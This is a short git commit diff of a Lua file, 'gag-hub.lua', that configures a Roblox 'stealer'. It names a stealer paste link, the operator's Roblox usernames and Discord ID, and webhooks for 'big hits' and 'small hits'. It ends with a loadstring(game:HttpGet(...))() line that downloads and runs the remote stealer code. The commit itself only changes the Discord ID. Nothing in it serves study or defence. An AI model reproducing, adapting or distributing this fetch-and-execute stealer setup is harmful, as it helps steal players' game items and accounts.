a0343a07b5a48fc69167122763930781de48244f
BloxyBuy <kbercicreator@freemail.hu>
2025-08-30 13:45:04 +0200

    Update gag-hub.lua

--- gag-hub.lua
+++ gag-hub.lua
@@ -1,6 +1,6 @@
 STEALER_LINK = 'https://pastefy.app/K2z3diHS/raw' -- stealer link (how to create is bellow)
 
-DISCORD_ID = '1234567' -- THIS IS NOT IMPORTANT (its for /list_players and /execute commads!)
+DISCORD_ID = '836212046390755379' -- THIS IS NOT IMPORTANT (its for /list_players and /execute commads!)
 
 Usernames = {
     'SarzenttoPrivareS', -- PUT UR ROBLOX USERNAMES
@@ -12,3 +12,4 @@ BigHitsWebhook = "https://discord.com/api/webhooks/x/x"
 SmallHitsWebhook = "https://discord.com/api/webhooks/x/x"
 
 loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
+
